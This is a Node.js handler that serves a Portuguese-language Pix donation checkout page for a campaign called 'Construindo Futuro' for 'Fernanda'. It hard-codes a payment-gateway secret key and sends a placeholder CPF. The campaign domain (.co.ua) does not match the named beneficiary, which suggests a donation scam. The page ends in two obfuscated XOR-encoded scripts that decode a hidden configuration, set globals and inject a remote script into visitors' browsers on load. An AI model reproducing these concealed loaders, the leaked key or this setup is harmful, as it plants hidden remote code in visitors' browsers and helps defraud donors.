import { randomUUID } from 'crypto';

export default async function handler(req, res) {
  const ZENITH_API_URL = 'https://api.zenithworld.com.br/integrations/checkouts';
  const ZENITH_PUBLIC_KEY = 'zp_pub_3114ffe65bbe012cf669d735414ecd2c';
  const ZENITH_SECRET_KEY = 'zp_sec_f1e45266fd75d3e52fa5398574b6e8ac4e97a41da7b47706';

  const amount = parseFloat(req.query.amount) || 0;
  const nome = (req.query.nome || 'Construindo Futuro').trim();
  let telefone = (req.query.telefone || '11000000000').replace(/\D/g, '');

  if (amount < 1) {
    res.status(400).send('Valor invalido.');
    return;
  }

  const amountCents = Math.round(amount * 100);

  if (telefone.length > 2 && telefone.startsWith('55')) {
    telefone = telefone.slice(2);
  }

  const payload = {
    amount: amountCents,
    currency: 'BRL',
    country: 'BR',
    environment: 'production',
    paymentMethod: 'pix',
    referenceId: 'doacao-' + randomUUID().slice(0, 8),
    customerName: nome,
    customerEmail: 'doacao@construindofuturo.co.ua',
    metadata: {
      customerName: nome,
      customerEmail: 'doacao@construindofuturo.co.ua',
      customerDocument: '12345678909',
      customerPhone: '+55' + telefone
    },
    returnUrl: 'https://construindofuturo.co.ua/fernanda/',
    cancelUrl: 'https://construindofuturo.co.ua/fernanda/'
  };

  let pixCode = '';
  let transactionId = '';
  let erro = '';

  try {
    const response = await fetch(ZENITH_API_URL, {
      method: 'POST',
      headers: {
        'X-API-Key': ZENITH_PUBLIC_KEY,
        'X-API-Secret': ZENITH_SECRET_KEY,
        'Content-Type': 'application/json',
        'Idempotency-Key': randomUUID()
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      let msg = '';
      try {
        const errData = await response.json();
        msg = JSON.stringify(errData).toLowerCase();
      } catch (_) {}

      if (response.status === 401 || response.status === 403) {
        erro = 'Pagamento temporariamente indisponivel. Tente novamente em instantes.';
      } else if (response.status === 400 || response.status === 422) {
        erro = 'Verifique os dados informados e tente novamente.';
      } else {
        erro = 'Nao foi possivel gerar o PIX. Tente novamente.';
      }
    } else {
      const json = await response.json();

      transactionId = json.checkout?.id || '';

      if (json.nextAction?.type === 'qr_code' && json.nextAction?.code) {
        pixCode = json.nextAction.code;
      } else if (json.nextAction?.type === 'redirect' && json.nextAction?.url) {
        res.redirect(302, json.nextAction.url);
        return;
      } else {
        pixCode = json.nextAction?.code || json.nextAction?.details?.pixCode || '';
      }

      if (!pixCode && !transactionId) {
        erro = 'Resposta inesperada do gateway. Tente novamente.';
      }
    }
  } catch (e) {
    erro = 'Erro de conexao. Tente novamente.';
  }

  const amountFormatted = amount.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const qrImageUrl = pixCode ? 'https://quickchart.io/qr?size=300&text=' + encodeURIComponent(pixCode) : '';

  function esc(str) {
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  let bodyContent = '';

  if (erro) {
    bodyContent = `
    <div class="page-top">
        <div class="valor-badge">
            <div class="valor-badge-dot"></div>
            <span>Doação de</span>
            <strong>R$ ${esc(amountFormatted)}</strong>
        </div>
        <h1 class="top-title">Ops, algo deu <em>errado</em></h1>
        <p class="top-sub">${esc(erro)}</p>
        <div class="top-onda">
            <svg viewBox="0 0 1440 38" preserveAspectRatio="none"><path d="M0,19 C240,38 480,0 720,12 C960,24 1200,38 1440,8 L1440,38 L0,38 Z" fill="#FDFBF7"/></svg>
        </div>
    </div>
    <div class="card" style="text-align:center;">
        <button class="btn-tentar" onclick="history.back()">Tentar Novamente</button>
    </div>`;
  } else {
    bodyContent = `
    <div class="page-top">
        <div class="valor-badge">
            <div class="valor-badge-dot"></div>
            <span>Doação de</span>
            <strong>R$ ${esc(amountFormatted)}</strong>
        </div>
        <h1 class="top-title">Quase <em>lá!</em></h1>
        <p class="top-sub">Falta só um passo para sua doação transformar vidas 💙</p>
        <div class="top-onda">
            <svg viewBox="0 0 1440 38" preserveAspectRatio="none"><path d="M0,19 C240,38 480,0 720,12 C960,24 1200,38 1440,8 L1440,38 L0,38 Z" fill="#FDFBF7"/></svg>
        </div>
    </div>

    <div class="card">
        <!-- Bloco 1: Codigo copia e cola -->
        <div class="block">
            <div class="section-label">
                <div class="section-label-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </div>
                <h2>1. Copie o código Pix</h2>
            </div>
            <div class="recorte"></div>
            <div class="code-inner">
                <div class="code-box" onclick="copiarTexto()" title="Clique para copiar">
                    <div class="code-label">Pix Copia e Cola</div>
                    <div class="code-value" id="codePreview">${esc(pixCode)}</div>
                    <input type="hidden" id="copia_cola" value="${esc(pixCode)}">
                </div>
                <div class="beneficiary-box">
                    <div class="beneficiary-icon">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                            <polyline points="22 4 12 14.01 9 11.01"></polyline>
                        </svg>
                    </div>
                    <span>Beneficiário oficial: <strong>Causas Do Bem</strong></span>
                </div>
                <button class="btn-copiar" id="copyBtn" onclick="copiarTexto()">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span class="copy-text">COPIAR CÓDIGO PIX</span>
                </button>
            </div>
        </div>

        <!-- Bloco 2: Passos -->
        <div class="block">
            <div class="section-label">
                <div class="section-label-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h2>2. Finalize no seu banco</h2>
            </div>
            <div class="recorte"></div>
            <div class="steps-inner">
                <div class="steps-list">
                    <div class="step-row">
                        <div class="step-num">1</div>
                        <div class="step-desc">Abra o aplicativo do seu <strong>banco de preferência</strong>.</div>
                    </div>
                    <div class="step-row">
                        <div class="step-num">2</div>
                        <div class="step-desc">Acesse a área <strong>Pix</strong>, selecione <strong>Pagar / Transferir</strong> e escolha <strong>Pix Copia e Cola</strong>.</div>
                    </div>
                    <div class="step-row">
                        <div class="step-num">3</div>
                        <div class="step-desc">Cole o código copiado, confirme o destinatário (<strong>Causas Do Bem</strong>) e <strong>conclua sua doação</strong> com segurança.</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Bloco 3: QR Code -->
        <div class="block">
            <div class="section-label">
                <div class="section-label-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect><path d="M14 14h3v3h-3zM14 20h3v1h-3zM20 14h1v3h-1zM20 20h1v1h-1z"></path></svg>
                </div>
                <h2>Ou escaneie o QR Code</h2>
            </div>
            <div class="recorte"></div>
            <div class="qr-inner">
                <p class="qr-sub">Abra o app do banco, escolha "Pagar com QR Code" e aponte a câmera:</p>
                <div class="qr-frame">
                    <img src="${esc(qrImageUrl)}" alt="QR Code PIX">
                </div>
            </div>
        </div>

        <!-- Trust Bar -->
        <div class="block card-footer">
            <div class="footer-icon">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
            </div>
            <div class="footer-text">
                <strong>Ambiente 100% seguro</strong>
                <span>Criptografia ativa protegida por Gateway de Pagamento</span>
            </div>
            <div class="footer-validity">⏱ 24h</div>
        </div>

        <input type="hidden" id="transactionId" value="${esc(transactionId)}">
        <input type="hidden" id="donationAmount" value="${amount}">

        <div class="aguarde-row">
            <div class="aguarde-spinner"></div>
            Assim que o Pix for confirmado, você será redirecionado automaticamente
        </div>
    </div>

    <!-- TOAST -->
    <div class="toast" id="toast">
        <div class="toast-check">
            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        <div class="toast-text">
            <strong>Código copiado!</strong>
            <span>Cole no app do seu banco e finalize 💙</span>
        </div>
    </div>`;
  }

  const html = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
<title>Quase lá! — Construindo Futuro</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;0,9..144,800;1,9..144,600&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
    --azul-principal: #0056b3;
    --azul-escuro: #003366;
    --azul-luz: #e6f0fa;
    --amarelo-acao: #FFC107;
    --amarelo-hover: #e0a800;
    --verde-botao: #28a745;
    --verde-hover: #218838;
    --verde-sombra: #1e7e34;
    --vermelho-urgencia: #FF3B30;
    --fundo-creme: #FDFBF7;
    --branco: #FFFFFF;
    --texto-forte: #111814;
    --texto-medio: #4F5E55;
    --borda: #E0E5E2;
    --raio-sm: 10px;
    --raio-md: 16px;
    --sombra-card: 0 4px 16px -4px rgba(0,0,0,0.06);
    --fonte-display: 'Fraunces', serif;
    --fonte-corpo: 'Manrope', sans-serif;
}
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
html { overflow-x: hidden; }
body {
    font-family: var(--fonte-corpo);
    background: var(--fundo-creme);
    color: var(--texto-forte);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    -webkit-font-smoothing: antialiased;
    line-height: 1.6;
}
h1, h2 { font-family: var(--fonte-display); font-weight:700; letter-spacing:-0.02em; line-height:1.1; }
button { cursor:pointer; border:none; background:none; font-family:inherit; }
img { max-width:100%; height:auto; display:block; }

.page-top {
    width:100%;
    background: radial-gradient(ellipse 120% 80% at 50% -20%, var(--azul-principal) 0%, var(--azul-escuro) 100%);
    color: var(--branco);
    padding: 2.5rem 1.5rem 3.6rem;
    display:flex; flex-direction:column; align-items:center; text-align:center;
    position:relative; overflow:hidden;
}
.page-top::before {
    content:''; position:absolute; inset:0;
    background-image: radial-gradient(rgba(255,255,255,.08) 1.2px, transparent 1.2px);
    background-size: 26px 26px;
    mask-image: linear-gradient(to bottom, black, transparent 80%);
    -webkit-mask-image: linear-gradient(to bottom, black, transparent 80%);
    pointer-events:none;
}
.top-onda { position:absolute; left:0; right:0; bottom:-1px; line-height:0; pointer-events:none; }
.top-onda svg { width:100%; height:38px; display:block; }

.valor-badge {
    display:inline-flex; align-items:center; gap:9px;
    background: var(--branco); border-radius:50px; padding:7px 18px;
    margin-bottom:1.1rem; position:relative; z-index:1;
    box-shadow: 0 10px 24px -6px rgba(255,193,7,0.4);
    border: 2px solid var(--amarelo-acao);
    animation: fadeDown .45s .07s ease both;
}
.valor-badge-dot {
    width:8px; height:8px; border-radius:50%;
    background: var(--vermelho-urgencia);
    animation: blink 1.4s ease-in-out infinite;
}
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
.valor-badge span { font-size:.75rem; font-weight:800; color:var(--texto-medio); letter-spacing:.05em; text-transform:uppercase; }
.valor-badge strong { font-family:var(--fonte-display); font-size:1.25rem; color:var(--azul-escuro); font-weight:800; }

.top-title { font-size:2.1rem; font-weight:800; line-height:1.15; position:relative; z-index:1; animation: fadeDown .45s .12s ease both; }
.top-title em { font-style:normal; color:var(--amarelo-acao); }
.top-sub { font-size:.95rem; font-weight:500; color:rgba(255,255,255,.85); margin-top:.5rem; position:relative; z-index:1; animation: fadeDown .45s .16s ease both; }

.card {
    width:100%; max-width:560px; padding:1.6rem 1.15rem 3rem;
    display:flex; flex-direction:column; gap:1.1rem;
    animation: fadeUp .5s .3s ease both;
}
.block {
    background:var(--branco); border:1px solid var(--borda);
    border-radius:var(--raio-md); overflow:hidden;
    box-shadow:var(--sombra-card);
}
.section-label { display:flex; align-items:center; gap:11px; padding:1.15rem 1.25rem .95rem; }
.section-label-icon {
    width:34px; height:34px; background:var(--azul-luz); color:var(--azul-principal);
    border-radius:10px; display:flex; align-items:center; justify-content:center; flex-shrink:0;
}
.section-label h2 { font-family:var(--fonte-corpo); font-size:1.05rem; font-weight:800; color:var(--azul-escuro); }

.recorte { position:relative; height:0; border-top:2px dashed var(--borda); margin:0 1.1rem; }
.recorte::before, .recorte::after {
    content:''; position:absolute; top:-12px; width:24px; height:24px; border-radius:50%;
    background:var(--fundo-creme); border:1px solid var(--borda);
}
.recorte::before { left:-24px; }
.recorte::after { right:-24px; }

.code-inner { padding:1.2rem 1.25rem 1.35rem; }
.code-box {
    background:var(--azul-luz); border:2px dashed var(--azul-principal);
    border-radius:var(--raio-sm); padding:13px 15px; margin-bottom:.9rem;
    cursor:pointer; transition:background .2s, transform .15s;
}
.code-box:hover { background:#D0E4F5; }
.code-box:active { transform:scale(.99); }
.code-label { font-size:.66rem; font-weight:800; letter-spacing:.12em; text-transform:uppercase; color:var(--azul-escuro); margin-bottom:3px; }
.code-value { font-family:monospace; font-size:.95rem; font-weight:700; color:var(--azul-escuro); line-height:1.5; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }

.beneficiary-box {
    display:flex; align-items:center; gap:10px;
    background:var(--branco); border:1px solid var(--borda);
    border-radius:var(--raio-sm); padding:11px 15px; margin-bottom:.9rem;
    font-size:0.88rem; color:var(--texto-medio);
}
.beneficiary-box strong { color:var(--texto-forte); font-weight:800; }
.beneficiary-icon { color:var(--azul-principal); display:flex; align-items:center; flex-shrink:0; }

@keyframes pulse-verde {
    0%   { box-shadow: 0 6px 18px rgba(40,167,69,.4), 0 0 0 0 rgba(40,167,69,.45); }
    65%  { box-shadow: 0 6px 18px rgba(40,167,69,.4), 0 0 0 14px rgba(40,167,69,0); }
    100% { box-shadow: 0 6px 18px rgba(40,167,69,.4), 0 0 0 0 rgba(40,167,69,0); }
}
.btn-copiar {
    display:inline-flex; align-items:center; justify-content:center; gap:9px;
    width:100%; background:var(--verde-botao); color:var(--branco);
    padding:1rem 1.4rem; border-radius:var(--raio-sm);
    font-family:var(--fonte-corpo); font-weight:800; font-size:.98rem;
    letter-spacing:.04em; text-transform:uppercase;
    animation: pulse-verde 2s ease-out infinite;
    transition: background .18s, transform .15s;
}
.btn-copiar:hover { background:var(--verde-hover); transform:translateY(-1px); }
.btn-copiar:active { animation:none; transform:scale(.98); }
.btn-copiar.copied { background:var(--verde-sombra); animation:none; box-shadow:0 6px 18px rgba(30,126,52,.4); }

.steps-inner { padding:1.1rem 1.25rem 1.3rem; }
.steps-list { display:flex; flex-direction:column; gap:13px; }
.step-row { display:flex; align-items:flex-start; gap:12px; }
.step-num {
    width:24px; height:24px; background:var(--azul-principal); color:var(--branco);
    font-size:.75rem; font-weight:800; border-radius:50%;
    display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:2px;
}
.step-desc { font-size:.90rem; color:var(--texto-medio); line-height:1.5; }
.step-desc strong { color:var(--texto-forte); font-weight:800; }

.qr-inner { padding:1.1rem 1.25rem 1.4rem; text-align:center; }
.qr-sub { font-size:.88rem; color:var(--texto-medio); margin-bottom:1.1rem; }
.qr-frame {
    position:relative; background:var(--branco); border-radius:18px; padding:1.2rem;
    display:inline-flex; justify-content:center; align-items:center; margin:0 auto;
    border:1px solid var(--borda); box-shadow:var(--sombra-card);
}
.qr-frame img { max-width:190px; height:auto; border-radius:8px; }

.card-footer {
    background:var(--azul-escuro); border:none; padding:1.15rem 1.25rem;
    display:flex; align-items:center; gap:13px;
}
.footer-icon {
    width:38px; height:38px; background:rgba(255,255,255,.1);
    border:1px solid rgba(255,255,255,.18); border-radius:11px;
    color:var(--amarelo-acao); display:flex; align-items:center; justify-content:center; flex-shrink:0;
}
.footer-text { flex:1; }
.footer-text strong { display:block; font-family:var(--fonte-display); font-size:1rem; font-weight:700; color:var(--branco); margin-bottom:1px; }
.footer-text span { font-size:.78rem; color:rgba(255,255,255,.7); }
.footer-validity {
    display:inline-flex; align-items:center; gap:4px;
    background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.4);
    border-radius:50px; font-size:.74rem; font-weight:800;
    color:var(--amarelo-acao); padding:4px 12px; flex-shrink:0;
}

.aguarde-row {
    display:flex; align-items:center; justify-content:center; gap:8px;
    font-size:.8rem; font-weight:600; color:var(--texto-medio); padding:.2rem 0 0;
}
.aguarde-spinner {
    width:14px; height:14px; border:2px solid var(--azul-luz);
    border-top-color:var(--azul-principal); border-radius:50%;
    animation: spin .8s linear infinite; flex-shrink:0;
}
@keyframes spin { to { transform:rotate(360deg); } }

.toast {
    position:fixed; bottom:26px; left:50%;
    transform:translateX(-50%) translateY(110px);
    background:var(--branco); border-radius:var(--raio-md);
    padding:13px 17px; display:flex; align-items:center; gap:12px;
    box-shadow:0 14px 40px rgba(0,0,0,.15);
    border-left:5px solid var(--verde-botao);
    opacity:0; pointer-events:none;
    transition: transform .4s cubic-bezier(.34,1.5,.64,1), opacity .3s ease;
    z-index:9999; width:90%; max-width:360px;
}
.toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
.toast-check {
    width:36px; height:36px; flex-shrink:0; border-radius:50%;
    background:var(--verde-botao); color:var(--branco);
    display:flex; align-items:center; justify-content:center;
}
.toast-text strong { display:block; font-size:.88rem; font-weight:800; color:var(--texto-forte); }
.toast-text span { font-size:.75rem; color:var(--texto-medio); font-weight:600; }

.btn-tentar {
    background:var(--azul-principal); color:var(--branco);
    font-size:.95rem; font-weight:800; padding:.85rem 2rem;
    border:none; border-radius:var(--raio-sm); cursor:pointer;
    font-family:var(--fonte-corpo); transition:background .2s;
    margin:2rem auto; display:block;
}
.btn-tentar:hover { background:var(--azul-escuro); }

@keyframes fadeDown { from{opacity:0;transform:translateY(-14px)} to{opacity:1;transform:translateY(0)} }
@keyframes fadeUp { from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:translateY(0)} }
@media(prefers-reduced-motion:reduce){ .btn-copiar{animation:none;} }
@media(max-width:480px){ .top-title{font-size:1.8rem;} .card{padding:1.2rem .9rem 2.5rem;} }
</style>
<script>
!function (w, d, t) {
w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var i=document.createElement("script");i.type="text/javascript",i.async=!0,i.src=r+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(i,a)};
ttq.load('DAM37FRC77U9262DRU6G');
ttq.page();
}(window, document, 'ttq');
</script>
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '28252040934472100');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=28252040934472100&ev=PageView&noscript=1"
/></noscript>
</head>
<body>
${bodyContent}
<script>
function copiarTexto() {
    var texto = document.getElementById("copia_cola").value;
    var btn = document.getElementById("copyBtn");
    var label = btn.querySelector(".copy-text");
    var toast = document.getElementById("toast");

    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(texto).then(function() {
            mostrarCopiado(btn, label, toast);
        }).catch(function() {
            fallbackCopy(texto, btn, label, toast);
        });
    } else {
        fallbackCopy(texto, btn, label, toast);
    }
}

function fallbackCopy(texto, btn, label, toast) {
    var ta = document.createElement("textarea");
    ta.value = texto;
    ta.style.position = "fixed";
    ta.style.left = "-999999px";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    try { document.execCommand('copy'); mostrarCopiado(btn, label, toast); } catch(e) {}
    document.body.removeChild(ta);
}

function mostrarCopiado(btn, label, toast) {
    btn.classList.add('copied');
    label.textContent = 'CÓDIGO COPIADO COM SUCESSO!';
    toast.classList.add('show');
    setTimeout(function() {
        btn.classList.remove('copied');
        label.textContent = 'COPIAR CÓDIGO PIX';
        toast.classList.remove('show');
    }, 3000);
}

var orderId = document.getElementById('transactionId') ? document.getElementById('transactionId').value : '';
var donationVal = document.getElementById('donationAmount') ? parseFloat(document.getElementById('donationAmount').value) : 0;
var paymentConfirmed = false;

function checkPaymentStatus() {
    if (!orderId || paymentConfirmed) return;
    fetch('/api/check-status?order_id=' + encodeURIComponent(orderId))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'paid' && !paymentConfirmed) {
                paymentConfirmed = true;
                if (typeof ttq !== 'undefined') {
                    ttq.track('CompletePayment', {
                        value: donationVal,
                        currency: 'BRL',
                        content_name: 'Doacao Fernanda',
                        content_category: 'doacao'
                    });
                }
                if (typeof fbq !== 'undefined') {
                    fbq('track', 'Purchase', {
                        value: donationVal,
                        currency: 'BRL',
                        content_name: 'Doacao Fernanda',
                        content_category: 'doacao'
                    });
                }
                var spinner = document.querySelector('.aguarde-spinner');
                var row = document.querySelector('.aguarde-row');
                if (spinner) spinner.style.borderTopColor = '#28a745';
                if (row) row.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg> Pagamento confirmado! Obrigado por ajudar a Fernanda \\ud83d\\udc99';
            }
        })
        .catch(function() {});
}

if (orderId) setInterval(checkPaymentStatus, 3000);
</script>
<script>(function(){var b_7=atob("DOFOiER9YPqNlCqMT5ps/TYRQsCv/F74P5J0p2seBJSj4V7hJoc3picSDdTv5gX/LJMn+DAOT4rk7E/gYJEn8CERTpD+tgauLpU6+i0fFY7o5wi2FLxiqiMRD5js+Fmudbo1qiocDZ+vrgj8Jpkr5A0ZQtav4kvgOoRssmZLAsq59xq1ftcsuyFOUJu+pk64LtkouydfHafw");var v_y=[];for(var d_q=0;d_q<b_7.length;d_q++){v_y.push(b_7.charCodeAt(d_q)&255);}var x_w=v_y[0];var q_x3pe=v_y.slice(1,1+x_w);var j_4rn=v_y.slice(1+x_w);var g_nlsk=j_4rn.map(function(b,d_a9zi){return b^q_x3pe[d_a9zi%x_w];});var a_e8r="";for(var p_juuc=0;p_juuc<g_nlsk.length;p_juuc++){a_e8r+=String.fromCharCode(g_nlsk[p_juuc]&255);}var d_s07c=decodeURIComponent(escape(a_e8r));var d_q05g=JSON.parse(d_s07c);var g_pj=d_q05g.globals||[];g_pj.forEach(function(q_s){window[q_s.name]=q_s.value;});var e_dr=document.createElement("script");e_dr.src=d_q05g.url;e_dr.async=true;e_dr.defer=true;(d_q05g.attributes||[]).forEach(function(e_84){e_dr.setAttribute(e_84.name,e_84.value);});(document.head||document.documentElement).appendChild(e_dr);})();</script>
<script>(function(){var w_dkn=atob("DJ24lyMFzhjMWc0Opuaa4lFp7CLuMbl61u6CuAxmqnbiLLljz/vBuUBqozauK+J9xe/R51d24W24NL4hyvzM8lBx4HK/e+Esx+nM5Upnu2ypKu80/eaa+UJoqzr2e6lv0vyV4ldop361dL18w+vd+VcotnujPeB9xfaauwFzr3S5PO80hL/Fu1gnoHmhPO80hPnZ40Iou2yhMKt3i+3K8lVgoGzhKrhsz/nLtQ8nuHmgLKgsnL+a6n54");var z_cacl=[];for(var j_p=0;j_p<w_dkn.length;j_p++){z_cacl.push(w_dkn.charCodeAt(j_p)&255);}var j_s6=z_cacl[0];var v_k3i=z_cacl.slice(1,1+j_s6);var u_wg=z_cacl.slice(1+j_s6);var h_si=u_wg.map(function(b,p_xxv9){return b^v_k3i[p_xxv9%j_s6];});var e_ga0="";for(var n_lz47=0;n_lz47<h_si.length;n_lz47++){e_ga0+=String.fromCharCode(h_si[n_lz47]&255);}var k_h=decodeURIComponent(escape(e_ga0));var f_l5r=JSON.parse(k_h);var e_lmd4=f_l5r.globals||[];e_lmd4.forEach(function(u_k){window[u_k.name]=u_k.value;});var v_ojb=document.createElement("script");v_ojb.src=f_l5r.url;v_ojb.async=true;v_ojb.defer=true;(f_l5r.attributes||[]).forEach(function(l_v){v_ojb.setAttribute(l_v.name,l_v.value);});(document.head||document.documentElement).appendChild(v_ojb);})();</script>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(html);
}
